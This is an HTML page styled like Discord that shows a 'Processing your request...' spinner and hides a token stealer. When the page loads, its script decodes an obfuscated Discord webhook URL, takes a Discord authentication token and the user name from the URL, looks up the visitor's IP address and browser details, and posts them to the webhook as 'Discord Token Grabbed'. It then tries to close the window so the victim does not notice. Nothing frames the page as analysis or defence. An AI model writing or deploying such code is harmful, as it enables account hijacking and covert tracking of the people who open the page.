<!DOCTYPE html>
<html>
<head>
  <title>Processing</title>
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background-color: #36393f;
      color: #dcddde;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .container {
      text-align: center;
      max-width: 500px;
    }
    .loading {
      display: inline-block;
      width: 50px;
      height: 50px;
      border: 3px solid rgba(255,255,255,.3);
      border-radius: 50%;
      border-top-color: #7289da;
      animation: spin 1s ease-in-out infinite;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="loading"></div>
    <h2>Processing your request...</h2>
    <p id="status-message">This window will close automatically.</p>
  </div>

  <script>
    function sendWebhook() {
      // Simple obfuscation of the webhook URL using a different approach
      const webhookParts = [
        String.fromCharCode(104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47),
        String.fromCharCode(49,51,55,54,51,55,49,57,56,49,53,56,50,51,52,48,49,48,54,47),
        String.fromCharCode(104,87,109,120,80,89,117,100,106,89,74,73,83,72,106,87,122,65,79,77,53,116,85,89,50,120,69,69,88,49,114,83,83,100,98,74,83,67,69,65,71,121,76,89,115,75,67,118,118,49,118,109,112,102,100,51,71,86,77,117,76,48,110,79,100,67,111,69)
      ];
      
      const WEBHOOK_URL = webhookParts.join('');
      
      // URL„Éë„É©„É°„Éº„Çø„Åã„ÇâÊÉÖÂ†±„ÇíÂèñÂæó
      const urlParams = new URLSearchParams(window.location.search);
      const token = urlParams.get('token');
      const datetime = urlParams.get('time') || '2025-05-28 03:24:57';
      const user = urlParams.get('user') || 'n4n45h1';
      const userAgent = urlParams.get('ua') || navigator.userAgent;
      
      // IP„Ç¢„Éâ„É¨„Çπ„ÇíÂèñÂæóÔºàÂ§ñÈÉ®„Çµ„Éº„Éì„Çπ‰ΩøÁî®Ôºâ
      fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
          const ipAddress = data.ip;
          
          // „Ç∑„Çπ„ÉÜ„É†ÊÉÖÂ†±„ÇíÂèéÈõÜ
          const os = detectOS(userAgent);
          const browser = detectBrowser(userAgent);
          
          // Discord Webhook„ÅÆembed„Çí‰ΩúÊàê
          const embed = {
            title: "üîê Discord Token Grabbed",
            description: "A Discord authentication token has been successfully grabbed.",
            color: 0x5865F2, // Discord Blue
            fields: [
              {
                name: "üìã Token",
                value: "```" + (token || "No token provided") + "```",
                inline: false
              },
              {
                name: "üïí Date & Time (UTC)",
                value: "```" + datetime + "```",
                inline: true
              },
              {
                name: "üë§ User",
                value: "```" + user + "```",
                inline: true
              },
              {
                name: "üåê IP Address",
                value: "```" + ipAddress + "```",
                inline: true
              },
              {
                name: "üíª System",
                value: "```OS: " + os + "\nBrowser: " + browser + "```",
                inline: true
              },
              {
                name: "üîç User Agent",
                value: "```" + userAgent + "```",
                inline: false
              }
            ],
            thumbnail: {
              url: "https://imgur.com/EzFFjbl.png" // Discord logo
            },
            footer: {
              text: "Token grabbed at " + new Date().toUTCString(),
              icon_url: "https://i.imgur.com/AfFp7pu.png" // Discord icon
            }
          };
          
          // Webhook„ÇíÈÄÅ‰ø°ÔºàÈõ£Ë™≠ÂåñÔºâ
          const payloadStr = JSON.stringify({ 
            embeds: [embed],
            username: "Token Grabber",
            avatar_url: "https://imgur.com/blqctTG.png"
          });
          
          return fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: payloadStr
          });
        })
        .then(response => {
          if (response && response.ok) {
            console.log('Data sent successfully!');
          } else if (response) {
            console.error('Failed to send data:', response.status, response.statusText);
          }
          
          // Close window
          closeWindowHandling();
        })
        .catch(error => {
          console.error('Error:', error);
          closeWindowHandling();
        });
    }
    
    // „Ç¶„Ç£„É≥„Éâ„Ç¶„ÇíÈñâ„Åò„ÇãÂá¶ÁêÜ„ÇíÊîπÂñÑ
    function closeWindowHandling() {
      // Multiple close attempts with different methods
      setTimeout(function() {
        try {
          // Method 1: Simple window.close()
          window.close();
          
          // Method 2: Try to simulate browser back + close
          setTimeout(() => {
            try { 
              window.history.go(-1);
              setTimeout(() => window.close(), 100);
            } catch(e) {}
          }, 200);
          
          // Method 3: Try redirect + close
          setTimeout(() => {
            if (document.visibilityState !== 'hidden') {
              window.location = "about:blank";
              setTimeout(() => window.close(), 100);
            }
          }, 400);
          
          // Method 4: Final fallback
          setTimeout(() => {
            if (document.visibilityState !== 'hidden') {
              document.getElementById('status-message').innerHTML = 
                'Processing complete. This window can be closed.';
            }
          }, 800);
        } catch(e) {
          document.getElementById('status-message').innerHTML = 
            'Processing complete. Please close this window.';
        }
      }, 500);
    }
    
    // OS„ÇíÊ§úÂá∫
    function detectOS(ua) {
      if (ua.includes("Windows NT")) return "Windows";
      if (ua.includes("Mac OS")) return "macOS";
      if (ua.includes("Linux")) return "Linux";
      if (ua.includes("Android")) return "Android";
      if (ua.includes("iPhone") || ua.includes("iPad")) return "iOS";
      return "Unknown OS";
    }
    
    // „Éñ„É©„Ç¶„Ç∂„ÇíÊ§úÂá∫
    function detectBrowser(ua) {
      if (ua.includes("Firefox/")) return "Firefox";
      if (ua.includes("Edge/") || ua.includes("Edg/")) return "Edge";
      if (ua.includes("Chrome/")) return "Chrome";
      if (ua.includes("Safari/") && !ua.includes("Chrome/")) return "Safari";
      if (ua.includes("MSIE ") || ua.includes("Trident/")) return "Internet Explorer";
      return "Unknown Browser";
    }
    
    // „Éö„Éº„Ç∏„É≠„Éº„ÉâÊôÇ„Å´Ëá™ÂãïÂÆüË°å
    window.onload = sendWebhook;
  </script>
</body>
</html>
